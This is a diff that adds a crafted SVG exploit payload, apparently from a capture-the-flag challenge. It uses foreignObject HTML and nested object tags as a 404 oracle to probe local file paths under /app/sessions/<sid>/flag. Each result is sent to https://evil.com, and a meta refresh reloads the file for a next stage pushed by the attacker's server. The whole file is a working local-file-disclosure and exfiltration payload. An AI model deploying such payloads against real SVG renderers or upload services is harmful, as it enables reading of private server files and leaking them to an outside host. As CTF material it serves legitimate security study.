@@ -1,0 +1,31 @@
+<svg width="960" height="850">
+    <!-- we can use a foreignobject to include arbitrary HTML -->
+    <foreignObject x="10" y="10" width="800" height="800">
+        <body xmlns="http://www.w3.org/1999/xhtml">
+            <!-- 
+                we can detect a 404 via an <object> tag. 
+                the object's body is only rendered if 
+                the object failed to load.
+
+                we try all directories under /flag and send
+                results to our server
+            -->
+            <object data="file:///app/sessions/<sid>/flag/0">
+                <object data="https://evil.com?404=0"></object>
+                404 on /flag/0
+            </object>
+            <object data="file:///app/sessions/<sid>/flag/1">
+                <object data="https://evil.com?404=1"></object>
+                404 on /flag/1
+            </object>
+
+            <!--
+                after a short time, we reload the file
+
+                before this happens, our evil.com server knows what 
+                the correct path is and re-uploads a new svg
+            -->
+            <meta http-equiv="refresh" content="10;URL='file:///app/sessions/<sid>/uploads/<fid>.svg'"/> 
+        </body>
+    </foreignObject>
+</svg>
